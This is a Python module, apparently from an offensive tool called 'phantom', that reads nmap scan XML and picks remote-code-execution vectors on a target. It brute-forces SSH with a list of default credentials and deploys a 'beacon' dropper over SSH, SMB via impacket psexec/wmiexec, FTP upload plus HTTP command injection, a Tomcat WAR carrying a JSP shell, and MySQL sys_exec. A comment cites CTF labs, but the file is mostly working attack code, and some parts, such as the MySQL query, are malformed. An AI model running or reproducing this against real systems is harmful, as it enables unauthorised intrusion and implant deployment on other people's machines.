"""
RCE Deployer: Intelligently execute commands on target based on detected services.
Reads scan XML to determine available RCE vectors (SSH, HTTP, SMB, etc).
"""

import os
import xml.etree.ElementTree as ET
import subprocess
from typing import List, Dict, Optional, Tuple
from phantom.utils.notifier import notifier
from rich.console import Console

console = Console()


# Default credentials by service (common in CTF/lab environments)
DEFAULT_CREDENTIALS = {
    "ssh": [
        ("root", "root"),
        ("root", ""),
        ("root", "password"),
        ("admin", "admin"),
        ("admin", "password"),
        ("msfadmin", "msfadmin"),
        ("user", "user"),
        ("ubuntu", "ubuntu"),
        ("debian", "debian"),
    ],
    "http": [
        ("admin", "admin"),
        ("admin", "password"),
        ("root", "root"),
    ],
    "smb": [
        ("Administrator", "Administrator"),
        ("Administrator", "password"),
        ("admin", "admin"),
    ],
    "ftp": [
        ("anonymous", "anonymous"),
        ("admin", "admin"),
        ("root", "root"),
    ]
}


def parse_scan_xml(target: str) -> Tuple[List[Dict], Dict, List[Dict]]:
    """
    Parse nmap XML scan results to extract open ports, service info, and credentials.
    Returns (list of open ports, os_info dict, list of found credentials).
    
    Example port dict:
    {
        "port": 22,
        "protocol": "tcp",
        "service": "ssh",
        "state": "open",
        "product": "OpenSSH",
        "version": "6.6.1",
        "creds": [{"username": "root", "password": "password", "method": "weak"}]
    }
    """
    xml_path = f"data/sessions/scan_{target}.xml"
    ports = []
    os_info = {}
    found_creds = []
    
    if not os.path.exists(xml_path):
        return ports, os_info, found_creds
    
    try:
        tree = ET.parse(xml_path)
        root = tree.getroot()
        
        for host in root.findall("host"):
            # Extract OS info
            os_elem = host.find("os")
            if os_elem is not None:
                best_match = None
                best_accuracy = 0
                for osmatch in os_elem.findall("osmatch"):
                    accuracy = int(osmatch.get("accuracy", "0"))
                    if accuracy > best_accuracy:
                        best_accuracy = accuracy
                        best_match = osmatch.get("name", "")
                if best_match and best_accuracy >= 85:
                    os_info["name"] = best_match
                    os_info["accuracy"] = best_accuracy
            
            # Extract open ports
            ports_elem = host.find("ports")
            if ports_elem is not None:
                for port_elem in ports_elem.findall("port"):
                    port_num = int(port_elem.get("portid"))
                    protocol = port_elem.get("protocol", "tcp")
                    state_elem = port_elem.find("state")
                    state = state_elem.get("state", "closed") if state_elem is not None else "closed"
                    
                    if state == "open":
                        service_elem = port_elem.find("service")
                        service_name = service_elem.get("name", "") if service_elem is not None else ""
                        product = service_elem.get("product", "") if service_elem is not None else ""
                        version = service_elem.get("version", "") if service_elem is not None else ""
                        
                        port_info = {
                            "port": port_num,
                            "protocol": protocol,
                            "service": service_name,
                            "state": state,
                            "product": product,
                            "version": version,
                            "creds": []
                        }
                        
                        # Check for credentials in script output
                        for script in port_elem.findall("script"):
                            script_id = script.get("id", "")
                            output = script.get("output", "")
                            
                            # Parse common credential indicators
                            if "ssh-auth" in script_id or "auth" in output.lower():
                                # Extract creds from output if found
                                if username_match := _extract_credentials_from_output(output):
                                    port_info["creds"].extend(username_match)
                        
                        ports.append(port_info)
    except Exception as e:
        notifier.error(f"Failed to parse scan XML: {e}")
    
    return ports, os_info, found_creds


def _extract_credentials_from_output(output: str) -> List[Dict]:
    """Extract credentials from nmap script output."""
    creds = []
    # Simple pattern matching for common credential formats
    import re
    
    patterns = [
        r'(?:username|user):\s*([^\s,]+)',
        r'(?:password|pass):\s*([^\s,]+)',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output, re.IGNORECASE)
        for match in matches:
            if match not in [c.get("password") for c in creds]:
                creds.append({"username": "found", "password": match, "method": "nmap_script"})
    
    return creds


def detect_rce_vectors(ports: List[Dict]) -> List[Dict]:
    """
    Detect available RCE vectors from open ports.
    
    Returns list of possible RCE methods:
    [
        {"method": "ssh", "port": 22, "priority": 1},
        {"method": "http_cmd_injection", "port": 80, "priority": 2},
        ...
    ]
    """
    vectors = []
    port_map = {p["port"]: p for p in ports}
    
    # SSH (highest priority for RCE if credentials available)
    if 22 in port_map:
        vectors.append({
            "method": "ssh",
            "port": 22,
            "priority": 10,  # High priority
            "description": "SSH - Execute via shell (needs credentials)"
        })
    
    # HTTP services (check for common RCE vulnerabilities)
    for port in [80, 8080, 8000, 8888, 443]:
        if port in port_map:
            # Could be Tomcat, Joomla, WordPress, etc.
            service = port_map[port].get("service", "").lower()
            product = port_map[port].get("product", "").lower()
            
            if "tomcat" in product or "apache-tomcat" in product:
                vectors.append({
                    "method": "http_tomcat_rce",
                    "port": port,
                    "priority": 8,
                    "description": f"HTTP Tomcat RCE (port {port})"
                })
            elif "joomla" in product or "wordpress" in product:
                vectors.append({
                    "method": "http_cms_rce",
                    "port": port,
                    "priority": 7,
                    "description": f"HTTP CMS RCE via plugin/upload (port {port})"
                })
            else:
                # Generic HTTP command injection
                vectors.append({
                    "method": "http_cmd_injection",
                    "port": port,
                    "priority": 5,
                    "description": f"HTTP command injection (port {port})"
                })
    
    # SMB (Windows or Samba)
    if 445 in port_map or 139 in port_map:
        smb_port = 445 if 445 in port_map else 139
        vectors.append({
            "method": "smb_rce",
            "port": smb_port,
            "priority": 6,
            "description": f"SMB RCE via psexec/wmi (port {smb_port})"
        })
    
    # FTP (if anonymous or weak creds)
    if 21 in port_map:
        vectors.append({
            "method": "ftp_upload_rce",
            "port": 21,
            "priority": 4,
            "description": "FTP upload + web RCE"
        })
    
    # MySQL
    if 3306 in port_map:
        vectors.append({
            "method": "mysql_udf_rce",
            "port": 3306,
            "priority": 5,
            "description": "MySQL UDF RCE (needs access)"
        })
    
    # Sort by priority
    vectors.sort(key=lambda x: x["priority"], reverse=True)
    return vectors


def execute_ssh_rce(target: str, port: int, username: str, password: str, command: str) -> Tuple[bool, str]:
    """Execute command via SSH with a single attempt."""
    try:
        # Check if sshpass is available
        import shutil
        if not shutil.which("sshpass"):
            notifier.warn("sshpass not found. Install: apt-get install sshpass")
            return False, "sshpass required"
        
        cmd = [
            "sshpass", "-p", password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=5",
            f"{username}@{target}", "-p", str(port),
            command
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0:
            return True, result.stdout
        else:
            return False, result.stderr
    except subprocess.TimeoutExpired:
        return False, "SSH connection timeout"
    except Exception as e:
        return False, str(e)


def brute_force_ssh(target: str, port: int, creds_to_try: List[Tuple[str, str]]) -> Optional[Tuple[str, str]]:
    """
    Try SSH credentials from the provided list.
    Returns (username, password) on success, None on failure.
    """
    console.print(f"\n[cyan][*] Attempting SSH brute force with {len(creds_to_try)} credential pairs...[/]")
    
    for username, password in creds_to_try:
        try:
            import shutil
            if not shutil.which("sshpass"):
                continue
            
            cmd = [
                "sshpass", "-p", password,
                "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ConnectTimeout=3",
                "-o", "BatchMode=yes",
                f"{username}@{target}", "-p", str(port),
                "echo 'OK'"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0 and "OK" in result.stdout:
                notifier.success(f"SSH credentials found: {username}:{password}")
                return (username, password)
            else:
                console.print(f"    [{username}:{password}] Failed")
        except subprocess.TimeoutExpired:
            console.print(f"    [{username}:{password}] Timeout")
            continue
        except Exception:
            continue
    
    return None


def execute_http_rce(target: str, port: int, command: str, path: str = "/") -> Tuple[bool, str]:
    """
    Execute command via HTTP command injection.
    Tries common vulnerable endpoints.
    """
    try:
        import requests
    except ImportError:
        return False, "requests library not available"
    
    # Common vulnerable parameters
    injection_points = [
        f"http://{target}:{port}{path}?cmd={{cmd}}",
        f"http://{target}:{port}{path}?command={{cmd}}",
        f"http://{target}:{port}{path}?exec={{cmd}}",
        f"http://{target}:{port}{path}?q={{cmd}}",
    ]
    
    for url_template in injection_points:
        try:
            url = url_template.format(cmd=command.replace(" ", "%20"))
            resp = requests.get(url, timeout=5, verify=False)
            if resp.status_code == 200:
                return True, resp.text
        except Exception:
            continue
    
    return False, "No injectable HTTP endpoint found"


def deploy_beacon_via_ssh(target: str, port: int, username: str, password: str, dropper: str) -> Tuple[bool, str]:
    """
    Deploy beacon via SSH by executing the dropper command.
    """
    console.print(f"\n[*] Attempting SSH RCE deployment to {target}:{port}")
    console.print(f"    Username: {username}")
    
    success, output = execute_ssh_rce(target, port, username, password, dropper)
    
    if success:
        notifier.success(f"Beacon deployed via SSH to {target}")
        return True, output
    else:
        notifier.error(f"SSH deployment failed: {output}")
        return False, output


def deploy_beacon_via_smb(target: str, username: str, password: str, dropper: str) -> Tuple[bool, str]:
    """
    Deploy beacon via SMB using impacket psexec or wmiexec.
    """
    console.print(f"\n[*] Attempting SMB RCE deployment to {target}")
    console.print(f"    Username: {username}")
    
    try:
        # Try psexec first
        cmd = [
            "python3", "-m", "impacket.psexec",
            f"{username}:{password}@{target}",
            dropper
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0:
            notifier.success(f"Beacon deployed via SMB psexec to {target}")
            return True, result.stdout
        else:
            # Try wmiexec as fallback
            cmd = [
                "python3", "-m", "impacket.wmiexec",
                f"{username}:{password}@{target}",
                dropper
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                notifier.success(f"Beacon deployed via SMB wmiexec to {target}")
                return True, result.stdout
            else:
                return False, "psexec and wmiexec both failed"
    except Exception as e:
        return False, str(e)


def deploy_beacon_via_ftp(target: str, port: int, username: str, password: str, dropper: str) -> Tuple[bool, str]:
    """
    Deploy beacon via FTP upload + web shell execution.
    Uploads beacon to /var/www/html or web-accessible directory.
    """
    console.print(f"\n[*] Attempting FTP RCE deployment to {target}:{port}")
    console.print(f"    Username: {username}")
    
    try:
        from ftplib import FTP
        
        ftp = FTP(timeout=10)
        ftp.connect(target, port)
        ftp.login(username, password)
        
        # Try common web directories
        web_dirs = ["/var/www/html", "/var/www", "/home/www-data", "/opt/web"]
        
        for web_dir in web_dirs:
            try:
                ftp.cwd(web_dir)
                break
            except:
                continue
        
        # Upload dropper as shell script
        beacon_name = "beacon.sh"
        ftp.storbinary(f"STOR {beacon_name}", open("/tmp/beacon_dropper.sh", "rb"))
        ftp.quit()
        
        # Now execute via HTTP
        console.print(f"[*] Executing beacon via HTTP...")
        success, _ = execute_http_rce(target, 80, f"chmod +x {beacon_name} && ./{beacon_name}", "/")
        
        if success:
            notifier.success(f"Beacon deployed via FTP+HTTP to {target}")
            return True, "FTP upload + HTTP execution successful"
        else:
            return False, "FTP upload succeeded but HTTP execution failed"
    
    except Exception as e:
        return False, str(e)


def deploy_beacon_via_tomcat(target: str, port: int, username: str, password: str, dropper: str) -> Tuple[bool, str]:
    """
    Deploy beacon via Tomcat WAR file upload.
    Requires Tomcat manager credentials.
    """
    console.print(f"\n[*] Attempting Tomcat RCE deployment to {target}:{port}")
    console.print(f"    Username: {username}")
    
    try:
        import requests
        import zipfile
        import tempfile
        
        # Create WAR file with dropper
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create JSP shell that executes dropper
            jsp_content = f"""
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {{
        Process p = Runtime.getRuntime().exec(new String[]{{"sh", "-c", "{dropper}"}});
        p.waitFor();
    }}
%>
<%= "Beacon deployed" %>
"""
            
            jsp_path = f"{tmpdir}/shell.jsp"
            with open(jsp_path, "w") as f:
                f.write(jsp_content)
            
            # Create WAR
            war_path = f"{tmpdir}/beacon.war"
            with zipfile.ZipFile(war_path, "w") as war:
                war.write(jsp_path, "shell.jsp")
            
            # Upload WAR via Tomcat manager
            url = f"http://{target}:{port}/manager/text/deploy"
            files = {"file": open(war_path, "rb")}
            
            resp = requests.post(
                url,
                auth=(username, password),
                files=files,
                params={"path": "/beacon"},
                timeout=10,
                verify=False
            )
            
            if resp.status_code in [200, 201]:
                notifier.success(f"Beacon deployed via Tomcat WAR to {target}")
                return True, resp.text
            else:
                return False, f"Tomcat upload failed: {resp.text}"
    
    except Exception as e:
        return False, str(e)


def deploy_beacon_via_mysql(target: str, port: int, username: str, password: str, dropper: str) -> Tuple[bool, str]:
    """
    Deploy beacon via MySQL UDF RCE (if privileges allow).
    Executes dropper command through MySQL sys_exec UDF.
    """
    console.print(f"\n[*] Attempting MySQL RCE deployment to {target}:{port}")
    console.print(f"    Username: {username}")
    
    try:
        import mysql.connector
        
        conn = mysql.connector.connect(
            host=target,
            port=port,
            user=username,
            password=password,
            timeout=10
        )
        
        cursor = conn.cursor()
        
        # Try to execute via INTO OUTFILE + shell
        cmd_encoded = dropper.replace('"', '\\"')
        query = f'SELECT INTO OUTFILE "/tmp/beacon.sh" "{cmd_encoded}"'
        
        try:
            cursor.execute(query)
            cursor.execute("SELECT @@version_compile_os")
            
            # Execute the shell script
            exec_query = 'SELECT sys_exec("/tmp/beacon.sh")'
            cursor.execute(exec_query)
            
            conn.commit()
            cursor.close()
            conn.close()
            
            notifier.success(f"Beacon deployed via MySQL to {target}")
            return True, "MySQL UDF execution successful"
        except:
            # Try alternative: direct command execution if sys_exec exists
            exec_query = f'SELECT sys_exec("{cmd_encoded}")'
            try:
                cursor.execute(exec_query)
                conn.commit()
                cursor.close()
                conn.close()
                
                notifier.success(f"Beacon deployed via MySQL to {target}")
                return True, "MySQL direct execution successful"
            except:
                cursor.close()
                conn.close()
                return False, "MySQL UDF not available or no privileges"
    
    except Exception as e:
        return False, str(e)


def ask_credentials(method: str, target: str = "", port: int = 22) -> Optional[Dict]:
    """
    Ask user for credentials based on RCE method.
    Tries automatic brute force first where applicable.
    """
    if method == "ssh":
        # Try automatic brute force with default credentials
        service_creds = DEFAULT_CREDENTIALS.get("ssh", [])
        
        creds = brute_force_ssh(target, port, service_creds)
        if creds:
            return {"username": creds[0], "password": creds[1], "auto": True}
        
        # If brute force fails, ask manually
        notifier.warn("SSH brute force failed with default credentials.")
        username = input("SSH Username [msfadmin]: ").strip() or "msfadmin"
        password = input("SSH Password [msfadmin]: ").strip() or "msfadmin"
        return {"username": username, "password": password, "auto": False}
    
    elif method == "smb_rce":
        # Try SMB default creds
        smb_creds = DEFAULT_CREDENTIALS.get("smb", [])
        console.print(f"\n[*] Trying SMB default credentials...")
        for username, password in smb_creds:
            console.print(f"    Trying {username}:{password}...")
            # For now just ask - SMB brute force is more complex
            pass
        
        username = input("SMB Username [Administrator]: ").strip() or "Administrator"
        password = input("SMB Password [blank]: ").strip() or ""
        return {"username": username, "password": password}
    
    elif method == "ftp_upload_rce":
        # Try FTP default creds
        ftp_creds = DEFAULT_CREDENTIALS.get("ftp", [])
        username = input("FTP Username [anonymous]: ").strip() or "anonymous"
        password = input("FTP Password [anonymous]: ").strip() or "anonymous"
        return {"username": username, "password": password}
    
    elif method == "http_tomcat_rce":
        username = input("Tomcat Manager Username [admin]: ").strip() or "admin"
        password = input("Tomcat Manager Password [admin]: ").strip() or "admin"
        return {"username": username, "password": password}
    
    elif method == "mysql_udf_rce":
        username = input("MySQL Username [root]: ").strip() or "root"
        password = input("MySQL Password [blank]: ").strip() or ""
        return {"username": username, "password": password}
    
    elif method == "http_cmd_injection":
        path = input("HTTP vulnerable path [/]: ").strip() or "/"
        return {"path": path}
    
    return None


def deploy_beacon(target: str, dropper: str) -> bool:
    """
    Intelligent beacon deployment workflow:
    1. Parse scan XML
    2. Detect RCE vectors
    3. Try automatic credentials (brute force)
    4. Ask user which method to use
    5. Execute RCE with dropper command
    """
    ports, os_info, found_creds = parse_scan_xml(target)
    
    if not ports:
        notifier.error(f"No open ports found in scan for {target}. Run scan first.")
        return False
    
    console.print(f"\n[cyan][*] Detected open ports:[/]")
    for p in ports:
        console.print(f"    {p['port']}/{p['protocol']:<3} {p['service']:<10} {p['product']}")
        if p.get("creds"):
            for cred in p["creds"]:
                console.print(f"        [green]Credentials found:[/] {cred}")
    
    vectors = detect_rce_vectors(ports)
    
    if not vectors:
        notifier.error("No RCE vectors detected from open ports.")
        return False
    
    console.print(f"\n[cyan][*] Available RCE methods:[/]")
    for i, vec in enumerate(vectors, 1):
        console.print(f"    [{i}] {vec['description']}")
    
    choice = input("\nSelect RCE method [1]: ").strip() or "1"
    
    try:
        idx = int(choice) - 1
        if idx < 0 or idx >= len(vectors):
            notifier.error("Invalid selection.")
            return False
    except ValueError:
        notifier.error("Invalid input.")
        return False
    
    selected = vectors[idx]
    method = selected["method"]
    port = selected["port"]
    
    console.print(f"\n[cyan][*] Using: {selected['description']}[/]")
    
    # Get credentials/params for the method
    creds = ask_credentials(method, target, port)
    if creds is None and method != "http_cmd_injection":
        notifier.warn("Cancelled deployment.")
        return False
    
    # Execute deployment
    if method == "ssh":
        success, output = deploy_beacon_via_ssh(
            target, port, creds["username"], creds["password"], dropper
        )
        return success
    
    elif method == "smb_rce":
        success, output = deploy_beacon_via_smb(
            target, creds["username"], creds["password"], dropper
        )
        return success
    
    elif method == "http_tomcat_rce":
        success, output = deploy_beacon_via_tomcat(
            target, port, creds["username"], creds["password"], dropper
        )
        return success
    
    elif method == "ftp_upload_rce":
        success, output = deploy_beacon_via_ftp(
            target, port, creds["username"], creds["password"], dropper
        )
        return success
    
    elif method == "mysql_udf_rce":
        success, output = deploy_beacon_via_mysql(
            target, port, creds["username"], creds["password"], dropper
        )
        return success
    
    elif method == "http_cmd_injection":
        success, output = execute_http_rce(target, port, dropper, creds.get("path", "/"))
        if success:
            notifier.success(f"Beacon deployed via HTTP to {target}")
            return True
        else:
            notifier.error(f"HTTP deployment failed: {output}")
            return False
    
    elif method == "http_cms_rce":
        # CMS exploitation would require plugin/theme upload - similar to HTTP injection
        notifier.warn("CMS RCE requires manual exploitation or plugin upload. Use generic HTTP injection.")
        return False
    
    else:
        notifier.warn(f"RCE method '{method}' not yet implemented.")
        console.print(f"Manual command: {dropper}")
        return False
